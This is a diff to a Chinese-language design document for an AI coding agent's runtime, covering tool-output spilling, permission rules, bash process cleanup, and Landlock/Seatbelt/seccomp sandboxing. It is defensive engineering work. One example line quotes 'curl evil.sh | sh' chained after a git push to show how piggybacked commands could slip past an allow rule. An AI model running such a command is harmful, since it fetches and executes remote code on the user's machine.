@@ -97,6 +97,15 @@ Plugin / Mcp),floor 是 `Auto`:远程工具跑在客户端自己的进程里,本
 | `web_fetch` | body 5 MiB / markdown 50000 字符 | 报告 `body_truncated` / markdown 截断标记 |
 | `web_search` | body 2 MiB / 输出 8 KB | 逐条累积到上限即停 |
 
+引擎另在模型上下文入口统一处理所有来源的工具文本:超过 12 KiB 时保留
+8 KiB 预览,并把完整文本写入工作区 `.zhuye/spill/` 供 `read` 字节分页读回。
+宿主收到的 `tool_call_end` 保持工具原始输出;模型历史与恢复历史使用同一
+预览和路径。写入失败时明确提示无法读回,图片块不受此文本预算影响。
+溢出文件在 Unix 上以仅所有者可读写权限创建；其他平台目前会报告保存失败。
+`read` 的 `byte_offset` / `byte_limit` 与行分页互斥,每页最多 4096 字节;
+按返回的 `next_byte_offset` 继续,避免拆分 UTF-8 字符,也支持大于 32 MiB
+的文本文件。
+
 按**字节**的截断都经 `zhuye_protocol::truncate_str` 做 char 边界
 对齐(0.8):CJK 内容一个汉字 3 字节,直接 `String::truncate` / byte-slice
 会在非边界处 panic。`web_fetch` 的 markdown 上限是**字符数**,不是字节。
@@ -243,6 +252,8 @@ timeout }`(`timeout` 是 `Duration`,不是毫秒数);`event` 接受
 规则引擎见 `zhuye-permissions`(tool 精确名 + tool_glob + bash
 shell_pattern,匹配上下文感知);bash 命令经 `classify_command` 三级
 分类(Safe / Risky / Dangerous)供审批分级。
+只读自动放行遇到未解析的展开、转义或重定向时会请求审批；支持脚本、
+写入参数或网络副作用的程序也不会仅凭程序名被视为只读。
 
 规则还可用 `resource_glob` 限定常用工具参数中的 `path`、`file_path`
 或 `url`。路径同时检查原始写法、工作区绝对路径和可解析的符号链接
@@ -264,6 +275,8 @@ action 而变**:
 - **`Allow` / `Ask` → 所有段都命中才命中。** 否则
   `allow = "git push *"` 会把 `git push origin main && curl evil.sh | sh`
   整条放行(前一段匹配上,后两段搭便车)。
+- `Allow` 命中但命令含变量展开、反引号、重定向、转义、括号或换行时,
+  glob 无法确定实际行为,改为强制审批;这也可能让无害的字面文本进入审批。
 
 另外两条:
 
@@ -286,6 +299,10 @@ action 而变**:
 `zhuye-hooks` 是单向依赖,而被两边共用的规范化不能放在任一层
 (与 `ToolError` 同一理由)。
 
+### bash 子进程生命周期
+
+Unix 前台和后台命令各自使用独立进程组。超时、用户中断、会话关闭或执行任务被丢弃时，运行时先终止仍在组内的进程，再回收直接子进程。正常退出按原命令结果处理。主动调用 `setsid` 或更换进程组的后代不受进程组清理覆盖；Windows 当前仍只保证直接子进程终止。
+
 ## §7 审批门(ApprovalGate)
 
 `zhuye-tools/src/approval/gate.rs`:`ask` 发出
@@ -299,10 +316,17 @@ ApproveForSession(会话内记忆)。hook 的 `Ask` 决策同样路由到此处
 
 `zhuye-sandbox/src/os_sandbox.rs`:macOS Seatbelt(profile 级策略,
 workspace-write 默认)/ Linux Landlock(路径白名单)。bash 工具的
-`sandbox` 参数启用;策略与权限模式正交(见 §6)。网络隔离目前仅
-`web_fetch` 层实施(SSRF 防护:私有网段 / 逐跳 redirect 校验)。
+OS 沙箱与权限模式正交(见 §6)。Linux 子进程默认使用 seccomp 禁止网络
+和 Unix socket 连接；`web_fetch` 另有私有网段及逐跳重定向的 SSRF 防护。
 
 `read` 与 LSP 工具同步文档时通过固定文件句柄读取，并拒绝路径替换造成的符号链接越界；`read` 在读取时也执行字节上限。LSP server 子进程自行访问文件不受此限制，其运行环境和权限应按来源配置。
+
+敏感路径(工作区顶层的 `.git` / `.agents` / `.aws`,以及宿主显式要求的路径)
+在 macOS Seatbelt 下真正只读(deny 规则,后匹配优先);Linux Landlock 无
+法在可写根内撤销嵌套路径的写权(规则按位合并,内核拒绝空掩码规则),故
+以「报告 + 按需失败关闭」处理:`metadata.path_protection` 列出每条路径
+是 `enforced` / `unsupported`;宿主要求必须只读时(`strict_paths`)直接
+拒绝执行。
 
 ### §8.2 Linux Landlock 的 handled 位集合(0.1)
 
@@ -311,13 +335,13 @@ workspace(及额外可写目录)通过 `landlock_add_rule` 放行。设计决策
 **只限制写类操作,读 / exec 完全不受限** —— 编译 / 分析常需读系统头与
 依赖,限制读会大面积破坏可用性。
 
-位集合是 `0x1ff2`(`WRITE_FILE | REMOVE_DIR | REMOVE_FILE | MAKE_CHAR |
-MAKE_DIR | MAKE_REG | MAKE_SOCK | MAKE_FIFO | MAKE_BLOCK | MAKE_SYM`),
+位集合是 `0x5ff2`(`WRITE_FILE | REMOVE_DIR | REMOVE_FILE | MAKE_CHAR |
+MAKE_DIR | MAKE_REG | MAKE_SOCK | MAKE_FIFO | MAKE_BLOCK | MAKE_SYM | TRUNCATE`),
 由命名常量逐个 OR 组合 + 编译期 `assert!` 守护。**不要**手写字面量:
 0.1 之前这里写作 `0xffe`,多含了 `READ_FILE` / `READ_DIR`(→ workspace
 外的读被内核拒,`execve` 时动态链接器读不到 `/usr/lib`,表现为
 `spawn failed: EACCES`),又漏了 `MAKE_SYM`(→ workspace 外的符号链接
-创建完全不受限)。
+创建完全不受限)。`TRUNCATE` 需要 Landlock ABI v3；启用 Linux 沙箱时缺少该能力即失败，避免 `truncate(2)` 绕过工作区写限制。
 
 ### §8.3 strict 模式与降级(0.1)
 
@@ -327,15 +351,16 @@ strict + 后端不可用时返回 `Err`,BashTool 据此抛
 
 - `strict = true`(默认):权限类 spawn 失败(EACCES / EPERM)直接
   fail-closed,**绝不**降级为无沙箱执行。Linux 上 `enforce_or_fail`
-  还会做一次非破坏性内核探测(`landlock_create_ruleset` 空调用),
-  拦住"内核完全没有 Landlock"这类假阳性。
-- `strict = false`:保留降级语义(重建 command 去掉 `pre_exec` 重试一次),
-  并打 `warn!`。用 `ZHUYE_SANDBOX_STRICT=0` 或 `ZHUYE_SANDBOX_OS_LEVEL=0`
-  显式开启。
+  还会非破坏性查询 Landlock ABI 版本,拒绝低于 v3 的内核。
+- `strict = false`:Linux 启用沙箱时仍失败关闭，不重试无沙箱命令。
+  `ZHUYE_SANDBOX_OS_LEVEL=0`
+  显式关闭沙箱仍按原有不可信来源闸门处理。
 
-`status_line()` 对网络边界**按 backend 如实报告**:Seatbelt 真发
-`(deny network*)`;Landlock 的 `handled_access_net` 恒为 0,所以标
-"网络:不受沙箱约束"而不是"网络:拒绝"。
+Linux 默认在 Landlock 外叠加 seccomp，阻止新建/连接套接字、关闭跨 exec
+继承的额外文件描述符并屏蔽 `io_uring` 等绕过路径。Unix socket 连接也
+被禁止，进程内部 `socketpair` 保留。过滤程序仅支持 x86_64/aarch64；
+内核不支持 `close_range` 或 seccomp、或过滤程序安装失败时拒绝执行。
+`status_line()` 报告请求的策略；命令成功启动才表明过滤程序已安装。
 
 ## §9 Plan mode
 
